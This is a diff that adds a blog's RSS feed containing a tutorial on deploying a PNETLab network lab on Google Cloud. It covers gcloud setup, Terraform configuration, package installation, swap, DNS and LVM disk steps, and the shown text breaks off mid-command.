@@ -1,0 +1,1462 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Ef&#39;s log</title>
+    <link>https://fahmifj.github.io/</link>
+    <description>Recent content on Ef&#39;s log</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Wed, 26 Mar 2025 13:27:29 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Deploy PNETLab on Google Cloud</title>
+      <link>https://fahmifj.github.io/articles/deploy-pnetlab-on-google-cloud/</link>
+      <pubDate>Wed, 26 Mar 2025 13:27:29 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/articles/deploy-pnetlab-on-google-cloud/</guid>
+      <description>In the previous article, I had an issue with Mac/Orbstack&amp;rsquo;s networking system, that prevented my localhost from communicating with the GNS3 appliances. Since I didn&amp;rsquo;t have enough time to troubleshoot it myself, I decided to give PNETLab a try.
+This time, I leveraged my GCP free trial to deploy the PNETLab server and used Terraform to automate the server provisioning. Then, I will use Tailscale to securely access the lab without exposing it to the Internet.</description>
+      <content:encoded><![CDATA[<p>In the previous article, I had an issue with Mac/Orbstack&rsquo;s networking system, that prevented my localhost from communicating with the GNS3 appliances. Since I didn&rsquo;t have enough time to troubleshoot it myself, I decided to give PNETLab a try.</p>
+<p>This time, I leveraged my GCP free trial to deploy the PNETLab server and used Terraform to automate the server provisioning. Then, I will use Tailscale to securely access the lab without exposing it to the Internet.</p>
+<p><strong>Goals</strong></p>
+<ul>
+<li>Automate PNETLab Deployment with Terraform.</li>
+<li>Secure access to the lab without exposing it to the public internet.</li>
+<li>Configure a domain for easy access to the lab.</li>
+</ul>
+<p><strong>Prerequisites</strong></p>
+<ul>
+<li>GCP CLI installed.</li>
+<li>Terraform installed.</li>
+<li>Tailscale account (free).</li>
+<li>Domain name.</li>
+</ul>
+<h2 id="network-diagram-overview">Network Diagram Overview</h2>
+<p>Here&rsquo;s an overview of what we going to do.</p>
+<img src="./imgs/image-20250326131830503.png" alt="image-20250326131830503" style="zoom:50%;" />
+<h2 id="preparing-gcp-project">Preparing GCP project</h2>
+<p>Before we begin, make sure that you&rsquo;ve authenticated to GCP.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ gcloud auth application-default login
+</span></span></code></pre></div><p>Once authenticated, create a project for our PNETLab deployment.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ <span class="nv">PROJECT_ID</span><span class="o">=</span>pnetlab-<span class="nv">$RANDOM</span>
+</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="nv">$PROJECT_ID</span>
+</span></span><span class="line"><span class="cl">pnetlab-xxx
+</span></span><span class="line"><span class="cl">$ gcloud projects create <span class="nv">$PROJECT_ID</span> --set-as-default
+</span></span></code></pre></div><p>Then, link the project to your billing account.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ gcloud billing accounts list              
+</span></span><span class="line"><span class="cl">ACCOUNT_ID            NAME                OPEN  MASTER_ACCOUNT_ID
+</span></span><span class="line"><span class="cl">AAAAAA-BBBBBB-CCCCCC  My Billing Account  True
+</span></span><span class="line"><span class="cl">$ gcloud billing projects link <span class="nv">$PROJECT_ID</span> --billing-account<span class="o">=</span>AAAAAA-BBBBBB-CCCCCC
+</span></span></code></pre></div><p>Last, enable Google Compute API.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ gcloud services <span class="nb">enable</span> compute.googleapis.com
+</span></span></code></pre></div><h2 id="server-deployment">Server Deployment</h2>
+<h3 id="preparing-terraform-code">Preparing Terraform Code</h3>
+<p>We&rsquo;ll use the following folder structure.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ tree
+</span></span><span class="line"><span class="cl">.
+</span></span><span class="line"><span class="cl">├── README.MD
+</span></span><span class="line"><span class="cl">├── ansible
+</span></span><span class="line"><span class="cl">└── terraform
+</span></span><span class="line"><span class="cl">    ├── terraforms.tfvars <span class="c1">#sensitive file (project_id, region, user/keys)</span>
+</span></span><span class="line"><span class="cl">    ├── main.tf 
+</span></span><span class="line"><span class="cl">    └── variables.tf
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">3</span> directories, <span class="m">5</span> files
+</span></span></code></pre></div><p>Within the terraform folder, initialize the terraform working directory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ terraform init
+</span></span></code></pre></div><h4 id="terraformtfvars">terraform.tfvars</h4>
+<p><code>terraforms.tfvars</code> contains the following (make your adjustment):</p>
+<pre tabindex="0"><code>project_id      = &#34;&#34;
+region          = &#34;&#34;
+zone            = &#34;&#34;
+os_image        = &#34;projects/ubuntu-os-cloud/global/images/ubuntu-1804-bionic-v20240116a&#34;
+ssh_user        = &#34;username&#34;
+ssh_pub_user    = &#34;ssh-ed25519 AAAAC3N... root&#34;
+ssh_pub_ansible = &#34;ssh-ed25519 AAAAC3N... ansible&#34;
+</code></pre><h4 id="maintf">main.tf</h4>
+<p><code>main.tf</code> file contains the following:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">terraform</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">required_providers</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">google</span> <span class="err">=</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">      <span class="err">source</span> <span class="err">=</span> <span class="nt">&#34;hashicorp/google&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">version</span> <span class="err">=</span> <span class="s2">&#34;~&gt; 4.5&#34;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="err">}</span>
+</span></span><span class="line"><span class="cl"><span class="err">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">provider</span> <span class="s2">&#34;google&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">project</span> <span class="err">=</span> <span class="err">var.project_id</span>
+</span></span><span class="line"><span class="cl">  <span class="err">region</span>  <span class="err">=</span> <span class="err">var.region</span>
+</span></span><span class="line"><span class="cl">  <span class="err">zone</span>    <span class="err">=</span> <span class="err">var.zone</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="err">SETUP</span> <span class="err">NETWORK</span> <span class="err">#</span>
+</span></span><span class="line"><span class="cl"><span class="err">resource</span> <span class="s2">&#34;google_compute_network&#34;</span> <span class="s2">&#34;pnetlab_vpc&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">name</span>                    <span class="err">=</span> <span class="nt">&#34;pnetlab-vpc&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">auto_create_subnetworks</span> <span class="err">=</span> <span class="kc">false</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">resource</span> <span class="s2">&#34;google_compute_subnetwork&#34;</span> <span class="s2">&#34;pnetlab_subnet&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">name</span>          <span class="err">=</span> <span class="nt">&#34;pnetlab-subnet&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">network</span>       <span class="err">=</span> <span class="err">google_compute_network.pnetlab_vpc.id</span>
+</span></span><span class="line"><span class="cl">  <span class="err">ip_cidr_range</span> <span class="err">=</span> <span class="s2">&#34;10.10.1.0/24&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">resource</span> <span class="s2">&#34;google_compute_firewall&#34;</span> <span class="s2">&#34;allow_ssh_access&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">name</span>    <span class="err">=</span> <span class="nt">&#34;allow-ssh&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">network</span> <span class="err">=</span> <span class="err">google_compute_network.pnetlab_vpc.id</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="err">allow</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">protocol</span> <span class="err">=</span> <span class="nt">&#34;tcp&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">ports</span>    <span class="err">=</span> <span class="p">[</span><span class="s2">&#34;22&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="err">source_ranges</span> <span class="err">=</span> <span class="p">[</span> <span class="s2">&#34;0.0.0.0/0&#34;</span> <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="err">NAT</span>
+</span></span><span class="line"><span class="cl"><span class="err">resource</span> <span class="s2">&#34;google_compute_router&#34;</span> <span class="s2">&#34;pnetlab_router&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">name</span> <span class="err">=</span> <span class="nt">&#34;pnetlab-router&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">region</span> <span class="err">=</span> <span class="err">var.region</span>
+</span></span><span class="line"><span class="cl">  <span class="err">network</span> <span class="err">=</span> <span class="err">google_compute_network.pnetlab_vpc.id</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">resource</span> <span class="s2">&#34;google_compute_router_nat&#34;</span> <span class="s2">&#34;pnetlab_router_nat&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">name</span> <span class="err">=</span> <span class="nt">&#34;pnetlab-router-nat&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">region</span> <span class="err">=</span> <span class="err">var.region</span>
+</span></span><span class="line"><span class="cl">  <span class="err">router</span> <span class="err">=</span> <span class="err">google_compute_router.pnetlab_router.name</span>
+</span></span><span class="line"><span class="cl">  <span class="err">nat_ip_allocate_option</span> <span class="err">=</span> <span class="s2">&#34;AUTO_ONLY&#34;</span> <span class="err">#</span> <span class="err">use</span> <span class="err">dynamic</span> <span class="err">public</span> <span class="err">ip</span> <span class="err">for</span> <span class="err">nat</span>
+</span></span><span class="line"><span class="cl">  <span class="err">source_subnetwork_ip_ranges_to_nat</span> <span class="err">=</span> <span class="s2">&#34;ALL_SUBNETWORKS_ALL_IP_RANGES&#34;</span> <span class="err">#</span> <span class="err">nat</span> <span class="err">any</span> <span class="err">sources</span> <span class="err">ip</span> <span class="err">range</span> <span class="err">available</span> <span class="err">within</span> <span class="err">the</span> <span class="err">vpc</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="err">SETUP</span> <span class="err">EXT</span> <span class="err">DISK</span> <span class="err">#</span>
+</span></span><span class="line"><span class="cl"><span class="err">resource</span> <span class="s2">&#34;google_compute_disk&#34;</span> <span class="s2">&#34;additional_disk&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">name</span>   <span class="err">=</span> <span class="nt">&#34;pnetlab-additional-disk&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">type</span>   <span class="err">=</span> <span class="s2">&#34;pd-standard&#34;</span>  <span class="err">#</span> <span class="err">Choose</span> <span class="err">disk</span> <span class="err">type</span> <span class="err">(pd-standard</span><span class="p">,</span> <span class="err">pd-ssd,</span> <span class="err">etc.)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">size</span> <span class="err">=</span> <span class="err">100</span> 
+</span></span><span class="line"><span class="cl">  <span class="err">lifecycle</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">prevent_destroy</span> <span class="err">=</span> <span class="err">true</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="err">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="err">SETUP</span> <span class="err">INSTANCES</span> <span class="err">#</span>
+</span></span><span class="line"><span class="cl"><span class="err">#</span> <span class="err">ubuntu</span><span class="mi">-1804</span><span class="err">-bionic-v</span><span class="mi">20240116</span><span class="err">a</span>                                 <span class="err">ubuntu-os-cloud</span>      <span class="err">ubuntu</span><span class="mi">-1804</span><span class="err">-lts</span>
+</span></span><span class="line"><span class="cl"><span class="err">resource</span> <span class="s2">&#34;google_compute_instance&#34;</span> <span class="s2">&#34;pnetlab_server&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">name</span>         <span class="err">=</span> <span class="nt">&#34;pnetlab-server&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">machine_type</span> <span class="err">=</span> <span class="s2">&#34;n2-standard-2&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">tags</span>         <span class="err">=</span> <span class="p">[</span><span class="s2">&#34;pnetlab&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="err">boot_disk</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">initialize_params</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">      <span class="err">image</span> <span class="err">=</span> <span class="err">var.os_image</span> <span class="err">#</span> <span class="err">cloud</span> <span class="err">image</span>
+</span></span><span class="line"><span class="cl">      <span class="err">size</span>  <span class="err">=</span> <span class="err">20</span>                 <span class="err">#</span> <span class="err">assign</span> <span class="err">20gb</span>
+</span></span><span class="line"><span class="cl">      <span class="err">type</span>  <span class="err">=</span> <span class="nt">&#34;pd-standard&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="err">#</span> <span class="err">external</span> <span class="err">disk</span> <span class="mi">100</span><span class="err">gb</span>
+</span></span><span class="line"><span class="cl">  <span class="err">attached_disk</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">source</span> <span class="err">=</span> <span class="err">google_compute_disk.additional_disk.id</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="err">network_interface</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">network</span>    <span class="err">=</span> <span class="err">google_compute_network.pnetlab_vpc.id</span>
+</span></span><span class="line"><span class="cl">    <span class="err">subnetwork</span> <span class="err">=</span> <span class="err">google_compute_subnetwork.pnetlab_subnet.id</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">Disable</span> <span class="err">public</span> <span class="err">IP</span>
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="err">access_config</span> <span class="err">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">#</span>  <span class="err">network_tier</span> <span class="err">=</span> <span class="nt">&#34;STANDARD&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">#</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="err">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="err">scheduling</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">automatic_restart</span>           <span class="err">=</span> <span class="err">true</span>
+</span></span><span class="line"><span class="cl">    <span class="err">on_host_maintenance</span>         <span class="err">=</span> <span class="nt">&#34;MIGRATE&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">preemptible</span>                 <span class="err">=</span> <span class="kc">false</span>
+</span></span><span class="line"><span class="cl">    <span class="err">provisioning_model</span>          <span class="err">=</span> <span class="s2">&#34;STANDARD&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="err">advanced_machine_features</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">enable_nested_virtualization</span> <span class="err">=</span> <span class="err">true</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="err">metadata</span> <span class="err">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="err">ssh-keys</span> <span class="err">=</span> <span class="nt">&#34;${var.ssh_user}:${var.ssh_pub_user} \n${var.ssh_user}:${var.ssh_pub_ansible}&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="err">}</span>
+</span></span></code></pre></div><h4 id="variablestf">variables.tf</h4>
+<p><code>variables.tf</code> define the variables we used in the <code>tfvars</code> file, it contains:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">variable</span> <span class="s2">&#34;project_id&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">type</span>        <span class="err">=</span> <span class="err">string</span>
+</span></span><span class="line"><span class="cl">  <span class="err">description</span> <span class="err">=</span> <span class="nt">&#34;Project ID&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">variable</span> <span class="s2">&#34;region&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">type</span>        <span class="err">=</span> <span class="err">string</span>
+</span></span><span class="line"><span class="cl">  <span class="err">description</span> <span class="err">=</span> <span class="nt">&#34;Project region&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">default</span>     <span class="err">=</span> <span class="s2">&#34;us-central&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">variable</span> <span class="s2">&#34;zone&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">type</span>        <span class="err">=</span> <span class="err">string</span>
+</span></span><span class="line"><span class="cl">  <span class="err">description</span> <span class="err">=</span> <span class="nt">&#34;Project zone&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">default</span>     <span class="err">=</span> <span class="s2">&#34;us-central1-a&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">variable</span> <span class="s2">&#34;os_image&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">type</span>        <span class="err">=</span> <span class="err">string</span>
+</span></span><span class="line"><span class="cl">  <span class="err">description</span> <span class="err">=</span> <span class="nt">&#34;OS family&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">variable</span> <span class="s2">&#34;ssh_user&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">type</span>        <span class="err">=</span> <span class="err">string</span>
+</span></span><span class="line"><span class="cl">  <span class="err">description</span> <span class="err">=</span> <span class="nt">&#34;The sudo user&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">variable</span> <span class="s2">&#34;ssh_pub_user&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">type</span>        <span class="err">=</span> <span class="err">string</span>
+</span></span><span class="line"><span class="cl">  <span class="err">description</span> <span class="err">=</span> <span class="nt">&#34;The public key used for authentication to an instance. Format: [public key] [username]&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">variable</span> <span class="s2">&#34;ssh_pub_ansible&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="err">type</span>        <span class="err">=</span> <span class="err">string</span>
+</span></span><span class="line"><span class="cl">  <span class="err">description</span> <span class="err">=</span> <span class="nt">&#34;The public key used for configuration management. Format: [public key] [username]&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="apply-configuration">Apply Configuration</h3>
+<p>With all the resource files defined, we will run the following command in the terraform directory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ terraform fmt         <span class="c1">#Format your Terraform files  </span>
+</span></span><span class="line"><span class="cl">$ terraform validate    <span class="c1">#Check for syntax errors  </span>
+</span></span><span class="line"><span class="cl">$ terraform plan -out pnetlab-deploy       <span class="c1">#Preview the infrastructure changes  </span>
+</span></span><span class="line"><span class="cl">$ terraform apply pnetlab-deploy -auto-approve  <span class="c1"># Deploy the resources  </span>
+</span></span></code></pre></div><p>After it finishes, check if the instance is running:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ gcloud compute instances list --filter<span class="o">=</span><span class="s2">&#34;name=pnetlab-server&#34;</span> --project<span class="o">=</span><span class="s2">&#34;</span><span class="nv">$PROJECT_ID</span><span class="s2">&#34;</span>
+</span></span></code></pre></div><h2 id="installing-pnetlab">Installing PNETLab</h2>
+<p>For this step, some are just copy-paste from the official installation guide at the <a href="https://www.pnetlab.com/pages/documentation?slug=how-to-deploy-pnetlab-box-on-google-cloud">PNETLab website</a>.</p>
+<h3 id="add-pnetlab-repository">Add PNETLab Repository</h3>
+<p>SSH into the server from the Google Cloud SSH browser. Once we logged in, add and install the pnetlab package.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ sudo su -
+</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;deb [trusted=yes] http://repo.pnetlab.com ./&#34;</span> <span class="p">|</span> sudo tee -a /etc/apt/sources.list
+</span></span><span class="line"><span class="cl">$ sudo apt-get update
+</span></span><span class="line"><span class="cl">$ sudo apt-get install pnetlab
+</span></span></code></pre></div><h3 id="create-swap-memory">Create Swap Memory</h3>
+<p>Create a swap disk, allocate the size according to your need.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# fallocate -l 1G /swapfile
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# chmod <span class="m">600</span> /swapfile
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# mkswap /swapfile
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# swapon /swapfile
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# cp /etc/fstab<span class="o">{</span>,.bak<span class="o">}</span>
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# <span class="s1">&#39;/swapfile none swap sw 0 0&#39;</span> <span class="p">|</span> sudo tee -a /etc/fstab
+</span></span></code></pre></div><h3 id="configure-pnetlab-dns">Configure PNETLab DNS</h3>
+<p>Edit file <code>/etc/network/interfaces</code> add line <code>dns-nameservers 8.8.8.8</code> to the configuration of interface <code>pnet0</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-toml" data-lang="toml"><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="c"># The primary network interface</span>
+</span></span><span class="line"><span class="cl"><span class="nx">iface</span> <span class="nx">eth0</span> <span class="nx">inet</span> <span class="nx">manual</span>
+</span></span><span class="line"><span class="cl"><span class="nx">auto</span> <span class="nx">pnet0</span>
+</span></span><span class="line"><span class="cl"><span class="nx">iface</span> <span class="nx">pnet0</span> <span class="nx">inet</span> <span class="nx">dhcp</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">dns-nameservers</span> <span class="mf">8.8</span><span class="p">.</span><span class="mf">8.8</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">bridge_ports</span> <span class="nx">eth0</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">bridge_stp</span> <span class="nx">off</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span></code></pre></div><p>And restart the networking service.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# sudo service networking restart
+</span></span></code></pre></div><h3 id="configure-additional-disk">Configure Additional Disk</h3>
+<p>Time to add the additional disk we defined in the terraform resource. The purpose of this disk is to store all the pnetlab project files as well as the images later.</p>
+<p>In my case, the additional disk is available at <code>/dev/sdb</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# lsblk
+</span></span><span class="line"><span class="cl">NAME    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
+</span></span><span class="line"><span class="cl">loop0     7:0    <span class="m">0</span> 40.4M  <span class="m">1</span> loop /snap/snapd/20671
+</span></span><span class="line"><span class="cl">loop1     7:1    <span class="m">0</span>  368M  <span class="m">1</span> loop /snap/google-cloud-cli/203
+</span></span><span class="line"><span class="cl">loop2     7:2    <span class="m">0</span> 63.9M  <span class="m">1</span> loop /snap/core20/2105
+</span></span><span class="line"><span class="cl">sda       8:0    <span class="m">0</span>   20G  <span class="m">0</span> disk 
+</span></span><span class="line"><span class="cl">├─sda1    8:1    <span class="m">0</span> 19.9G  <span class="m">0</span> part /
+</span></span><span class="line"><span class="cl">├─sda14   8:14   <span class="m">0</span>    4M  <span class="m">0</span> part 
+</span></span><span class="line"><span class="cl">└─sda15   8:15   <span class="m">0</span>  106M  <span class="m">0</span> part /boot/efi
+</span></span><span class="line"><span class="cl">sdb       8:16   <span class="m">0</span>  100G  <span class="m">0</span> disk 
+</span></span></code></pre></div><p>We&rsquo;ll create an LVM disk out of it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# vgcreate /dev/vg01 /dev/sdb
+</span></span><span class="line"><span class="cl">  Volume group <span class="s2">&#34;vg01&#34;</span> successfully created
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# lvcreate -l 100%FREE --name lv01 vg01 
+</span></span><span class="line"><span class="cl">  Logical volume <span class="s2">&#34;lv01&#34;</span> created.
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# mkfs.ext4 /dev/vg01/lv01 
+</span></span><span class="line"><span class="cl">mke2fs 1.44.1 <span class="o">(</span>24-Mar-2018<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Discarding device blocks: <span class="k">done</span>                            
+</span></span><span class="line"><span class="cl">Creating filesystem with <span class="m">26213376</span> 4k blocks and <span class="m">6553600</span> inodes
+</span></span><span class="line"><span class="cl">Filesystem UUID: f1173542-f07c-493f-89e6-188439880465
+</span></span><span class="line"><span class="cl">Superblock backups stored on blocks: 
+</span></span><span class="line"><span class="cl">  32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, 2654208, 
+</span></span><span class="line"><span class="cl">  4096000, 7962624, 11239424, 20480000, <span class="m">23887872</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Allocating group tables: <span class="k">done</span>                            
+</span></span><span class="line"><span class="cl">Writing inode tables: <span class="k">done</span>                            
+</span></span><span class="line"><span class="cl">Creating journal <span class="o">(</span><span class="m">131072</span> blocks<span class="o">)</span>: <span class="k">done</span>
+</span></span><span class="line"><span class="cl">Writing superblocks and filesystem accounting information: <span class="k">done</span>
+</span></span></code></pre></div><p>Then we set a mount point for the volume we just created.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# mkdir /mnt/unetlab
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# mount /dev/vg01/lv01 /mnt/unetlab
+</span></span></code></pre></div><p>Edit the <code>/etc/fstab</code> file and add the following line to mount <code>/mnt/unetlab</code> on boot:</p>
+<pre tabindex="0"><code>/dev/vg01/lv01  /mnt/unetlab  ext4  defaults  0  0
+</code></pre><p>Now we&rsquo;ll create a new directory for PNETLab project files and image files in our newly mounted disk.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# mkdir /mnt/unetlab/addons
+</span></span><span class="line"><span class="cl">root@pnetlab-server:~# mkdir /mnt/unetlab/labs
+</span></span></code></pre></div><p>Next, we&rsquo;ll remove the old directories for project files and image files, and replace them with symbolic links pointing to the new directories on the mounted disk.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pnetlab-server:~# rm -rf /opt/unetlab/addons/ 
